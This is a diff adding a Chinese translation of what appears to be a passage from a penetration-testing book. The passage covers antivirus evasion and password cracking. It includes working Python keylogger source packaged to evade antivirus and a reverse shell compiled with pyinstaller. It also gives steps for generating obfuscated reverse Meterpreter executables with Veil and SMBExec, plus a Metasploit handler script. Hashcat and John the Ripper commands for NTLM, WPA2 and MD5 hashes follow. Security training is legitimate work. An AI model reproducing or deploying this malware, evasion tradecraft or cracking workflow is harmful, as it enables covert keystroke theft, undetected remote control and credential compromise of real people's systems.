@@ -1,0 +1,289 @@
+
+这段代码执行时，会向 `192.168.10.100` 反弹一个 Shell，我在该主机上用 netcat 监听 5151 端口。这个反向 Shell 将给我提供目标主机的命令行访问权限。使用 `pyinstaller`，我们可以将 Python 文件转换为可执行文件。
+
+```
+C:\python27\python.exe C:\utils\pyinstaller-2.0\pyinstaller.py --out=C:\shell\ --noconsole --onefile C:\shell\shell.py
+```
+
+同样，如果你尝试用杀毒软件扫描该文件，它不会被检测到。
+
+#### Python 键盘记录器[²⁹]
+
+每个人使用不同类型的键盘记录器，我的目标是开发一种最可能被白名单应用程序列表接受且能在杀毒软件下隐蔽运行的工具。
+
+下面是让 Python 开始记录所有按键的简单代码。
+
+```python
+import pyHook, pythoncom, sys, logging
+
+file_log = 'C:\\systemlog.txt'
+
+def OnKeyboardEvent(event):
+    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10, chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
+```
+
+这是我的 `setup.py` 文件：
+
+```python
+from distutils.core import setup
+import py2exe
+
+setup(options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
+      windows = [{'script': "logger.py"}],
+      zipfile = None,
+)
+```
+
+使用 `py2exe`，我将通过以下命令把 Python 脚本转换为可执行文件：
+
+```
+python.exe setup.py install
+python.exe setup.py py2exe
+```
+
+现在我得到了一个键盘记录器的可执行二进制文件，它记录所有按键并将日志存储到 `C:\systemlog.txt`。非常简单易行，且杀毒软件从未检测到它。如果需要，你可以添加一些随机性以确保不被特征码或哈希匹配检测到。
+
+### Veil 示例 (Kali Linux)
+
+## Veil Payload Generator
+
+Veil 是由 Christopher Truncer 创建的用于绕过杀毒软件的 Payload 生成器。该工具使用多种不同的方法来规避 AV，但最著名的是将 Meterpreter shell 转换为 Python，并将其封装在 `py2exe`/`pyinstaller` 中。这样生成的可执行文件可以绕过许多白名单工具和 AV。这是因为 Python 通常是被批准的白名单应用程序，并且可以轻松编码以绕过 AV。使用 Veil 的方法有很多种，但我将介绍最通用的一种。
+
+### 创建混淆的反向 Meterpreter 可执行文件：
+
+1.  `cd /opt/Veil`
+
+2.  `./Veil.py`
+
+3.  选择 MeterHTTPSContained payload：
+
+    *   `use 20`
+
+4.  与 Metasploit 一样，我们接下来需要设置 `LHOST` 和 `LPORT`。在本例中，我的攻击者系统是 `192.168.75.131`，`LPORT` 将是 `443`（以模仿 SSL）。
+
+    *   `set LHOST 192.168.75.131`
+
+    *   `set LPORT 443`
+
+5.  `generate`
+
+![Figure 132 - Configuring Veil](img/00214.jpeg)
+
+如前所述，我们希望将 payload 封装在 Python 中以帮助规避检测。我们可以通过配置以下命令来完成此操作：
+
+1.  选择 Pyinstaller
+
+    *   `1`
+
+![Figure 133 - Using Python to Compile Reverse HTTPS Meterpreter](img/00215.jpeg)
+
+可执行文件将位于 `/root/veil-output/compiled/` 文件夹中。不要将此文件上传到 Virus Total 这类网站，因为这可能会在你的行动开始前就向 AV 预警，但你应该使用本地的 AV 实例进行验证，以确保它们不会触发任何特征码。这种方法目前尚未让我失手，应该成为你武器库的一部分。
+
+## SMBExec (Kali Linux)
+
+SMBExec 是由 brav0hax 开发的工具（[`github.com/brav0hax/smbexec`](https://github.com/brav0hax/smbexec)），包含许多不同的功能。在本书中，我们曾用该工具从域控制器提取哈希值，但它也可用于枚举共享、验证登录、禁用 UAC，以及创建混淆的 Meterpreter 可执行文件。Brav0hax 利用多种不同的混淆技术，包括随机化和使用原生 C 语言编译以绕过 AV（请阅读 `smbexec.sh` 的源代码）。这就是我们将用来创建反向 shell 的方法。
+
+### 创建混淆的反向 Meterpreter 可执行文件：
+
+1.  `cd /opt/smbexec`
+
+2.  `./smbexec.sh`
+
+3.  使用以下命令选择 System Access：
+
+    *   `2`
+
+4.  选择 Create an executable and rc script
+
+    *   `2`
+
+5.  选择 `windows/meterpreter/reverse_https`
+
+    *   `2`
+
+6.  输入你的本地主机和端口
+
+    *   `172.16.139.209`
+
+    *   `443`
+
+SMBExec 完成并退出应用程序后，会在同一目录下创建一个新文件夹。该文件夹遵循类似的时间戳命名格式。在该文件夹内，你将看到 `backdoor.exe`，这就是你的混淆反向 HTTPS Meterpreter 可执行文件。
+
+```
+root@kali:/opt/smbexec/2013-12-23-1425-smbexec# ls -alh
+total 128K
+drwxr-xr-x 2 root root 4.0K Dec 29 18:28 .
+drwxr-xr-x 10 root root 4.0K Dec 23 14:44 ..
+-rwxr-xr-x 1 root root 110K Dec 23 14:28 backdoor.exe
+-rw-r--r- 1 root root 283 Dec 23 14:28 metasetup.rc
+-rw-r--r- 1 root root 92 Dec 23 14:28 sha1-backdoor.hash
+```
+
+在同一文件夹中，你还将看到 `metasetup.rc` 脚本。RC 脚本将在本书后面讨论，但如果你查看该文件，会看到类似于下面的代码：
+
+```
+spool /opt/smbexec/2013-12-23-1425-smbexec/msfoutput-1425.txt
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 172.16.139.209
+set LPORT 443
+set SessionCommunicationTimeout 600
+set ExitOnSession false
+set InitialAutoRunScript migrate -f
+exploit -j -z
+```
+
+这是一个自动配置并运行你刚生成的 payload 的反向处理器的脚本。它还添加了设置超时和自动迁移 PID 等命令。运行 RC 脚本的命令如下：
+
+*   `msfconsole -r metasetup.rc`
+
+![Figure](img/00216.jpeg)
+
+如果你正在对抗杀毒软件，这应该能让你很好地了解从何处入手。你最不希望看到的是 AV 阻止你攻破一个你可能已有漏洞利用代码的目标主机。虽然有许多不同的规避 AV 技术，这并非详尽列表，但能让你了解如何着手。
+
+渗透测试的核心在于尝试不同的工具、技术和战术，以找到在特定环境中行之有效的方法。请记住，不要将你的可执行文件提交给 Virus Total 之类的仓库，因为这会大幅缩短你的可执行文件的生命周期。
+
+![Figure](img/00217.jpeg)
+
+## 杂项渗透测试技巧
+
+本节收集了其他有助于渗透测试但未在别处归类的内容。我将讨论一些关于破解密码哈希、搜索漏洞以及我使用的一些快捷方式的技巧和窍门。
+
+![Figure](img/00218.jpeg)
+
+### 密码破解
+
+有许多不同的密码破解工具，我将重点介绍我使用的两个主要工具。这两个工具是 John the Ripper (JtR) 和 oclHashcat。它们都是优秀的密码破解工具。
+
+在讨论不同的密码破解器之前，重要的是要确保你理解基本定义。为了实现高效的密码破解过程，通常需要配置的三个要素是定义字典、规则和哈希算法。
+
+#### 字典
+
+这正如其名。它们是包含明文密码列表的文件。密码破解软件会尝试对这些密码中的每一个进行哈希运算，并查看是否与你试图破解的哈希值匹配。
+
+我通常喜欢从之前的密码泄露事件中获取字典，并结合你正在对付的组织类型进行整合。例如，如果你要从域控制器破解 NTLM 哈希，请确保了解他们的密码策略。如果他们要求最少 8 个字符，尝试 4 或 5 位的密码就毫无意义。
+
+以下是我最喜欢的一些字典：
+
+**列表名称：** RockYou
+
+**详情：** 2009 年来自一个社交游戏和广告网站的泄露。这是一个很好的入门列表，因为它体积不太大，且包含大量常见密码，成功率不错。
+
+**下载链接：** `http://downloads.skullsecurity.org/passwords/rock-you.txt.bz2`
+
+**列表名称：** Crackstation-human-only
+
+**详情：** 从各种网站数据库泄露的真实人类密码。该列表中约有 6400 万个密码。
+
+**下载链接：** `http://bit.ly/1cRS62E`
+
+**列表名称：** m3g9tr0n_Passwords_WordList_CLEANED^[30]
+
+**详情：** 包含 1.22 亿个密码的列表
+
+**下载链接：** `http://bit.ly/KrTcHF`
+
+#### 规则
+
+规则定义是否需要向字典中注入任何修改。描述规则最好的方式是通过一个易于理解的示例。我们可以使用 KoreLogicRulesAppendYears^[31] 规则集，其内容如下：
+
+```
+cAz”19[0-9][0-9]”
+Az”19[0-9][0-9]”
+cAz”20[01][0-9]”
+Az”20[01][0-9]”
+```
+
+它会将 1949 年到 2019 年的年份追加到每个密码后面。因此，如果密码列表中包含单词 "hacker"，它将尝试破解从 `hacker1949` 一直到 `hacker2019` 的哈希值。请记住，规则越复杂，遍历字典中所有单词所需的时间就越长。
+
+#### 哈希算法
+
+哈希算法用于生成密码哈希。这些非常重要，因为如果你选择了错误的算法，要么无法运行，要么无法破解。例如，如果我们为 SHA1 哈希选择 MD5 算法，破解工具将找不到任何可破解的哈希值并立即退出。
+
+现在我们已经基本了解了不同的破解配置，让我们来对比一下 John the Ripper 和 oclHashcat。
+
+![Figure](img/00219.jpeg)
+
+我过去经常使用 JtR，但由于 oclHashcat 的 GPU 支持，我已经有一段时间没用了。不过 JtR Jumbo 现在确实支持 CUDA 和 OpenCL。以下是 JtR 哈希格式列表，可帮助您识别正在破解的类型：[`pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats`](http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)。
+
+### 破解 MD5 哈希
+
+假设您能够攻破一台 \*nix 系统，或者可能是一个装满密码哈希的数据库。您最有可能遇到 MD5 或 SHA 哈希，但在以下示例中，我们假设它们是非加盐的 MD5 哈希。如果您想破解标准 MD5 哈希，基本命令是：
+
+*   `john -format=raw-md5 -pot=./list.pot md5list.txt`
+
+这将告诉 John the Ripper 在 `md5list.txt` 文件中查找 MD5 哈希，并将破解出的密码写入 `list.pot` 文件。
+
+```
+root@kali:~# john —format=raw-md5 —pot=./list.pot md5list.txt
+
+Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2])
+
+test (test)
+
+password (user)
+
+woot (hacker)
+
+guesses: 3 time: 0:00:00:01 DONE (Sun Dec 29 18:32:12 2013)
+```
+
+如果您使用的是 JtR Jumbo 包并想利用 GPU 处理：
+
+```
+john —format=raw-md5-opencl —wordlist=./Wordlists/all.lst —rules: Single md5list.txt
+```
+
+以下是关于使用 JtR 的其他资源：[`blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords`](http://blog.thireus.com/cracking-story-how-i-cracked-over-122-million-sha1-and-md5-hashed-passwords)。
+
+![](img/00220.jpeg)
+
+老实说，这是我破解密码时最常用的工具。众所周知，图形处理单元（GPU）非常适合破解密码，因为它们利用许多不同的内核并行工作。使用 GPU 与 CPU 相比优势显著，这可以通过 oclHashcat 的使用来证明。
+
+在以下示例中，我将介绍破解 WPAv2 和 NTLMv2。这些是我遇到的最常见的哈希类型，实际上也是任何其他类型哈希的基础。如果您想查看 oclHashcat 支持的所有不同哈希类型，请访问他们的网站：[`hashcat.net/oclhashcat/`](http://hashcat.net/oclhashcat/)。
+
+### 破解 WPAv2
+
+在本书开头，我讨论了如何捕获破解密码所需的 WPAv2 握手包。捕获的输出是一个 `.hccap` 文件。这是 oclHashcat 支持的用于暴力破解 WPA 哈希密码的文件格式。
+
+在以下示例中，我将在我的 Windows 主机上使用配备 GeForce GTX 680 的 oclHashcat。虽然我确实更喜欢使用 ATI Radeon 显卡，但实际上对于这个示例来说，区别不大。要开始破解密码，我将使用以下命令：
+
+*   `cudaHashcat-plus64.exe -m 2500 out.hccap list\\rockyou.txt`
+
+![](img/00221.jpeg)
+
+**图 134 - oclHashcat 示例**
+
+这是一个非常直接的示例，意思是针对 `out.hccap` 文件破解 WPAv2 哈希，并使用来自 `rockyou.txt` 的密码列表。
+
+### 破解 NTLMv2
+
+如果您攻破了一台 Windows 主机，或者可能是一个域控制器，您将不得不破解 NTLM 哈希。您可以随时尝试针对 LM 哈希，但由于这越来越少见，我们将坚持使用 NTLM 哈希。
+
+在以下示例中，我们获取一个 NTLM 哈希列表，并使用 rockyou 密码列表。
+
+![](img/00222.jpeg)
+
+**图 135 - oclHashcat NTLM**
+
+从上面的示例中，有 3 个唯一密码，但 oclHashcat 只能破解其中两个。为了增加机会，我将添加 passwordspro 规则集来配合 rockyou 密码列表。如果您想更深入地了解这些规则，请尝试从 oclHashcat 页面开始：[`hashcat.net/wiki/doku.php?id=rule_based_attack`](http://hashcat.net/wiki/doku.php?id=rule_based_attack)。
+
+![](img/00223.jpeg)
+
+**图 136 - 带规则的 oclHashcat**
+
+使用规则实际上并没有找到第 3 个哈希的密码。在更大的密码哈希列表中，这肯定会找到更多密码，但在这种情况下只能找到 3 个密码中的 2 个。为了进一步增加机会，我将尝试一个大得多的密码列表。这当然会增加运行此作业所需的时间，但如果能解出一个密码，就值得。所以我将使用的命令是：
+
+*   `cudaHashcat-plus64.exe -m 1000 NTLM.txt list\\realhuman.txt -r rules\\passwordspro.rule`
+
+![](img/00224.jpeg)
+
+**图 137 - 使用不同密码列表的 oclHashcat**
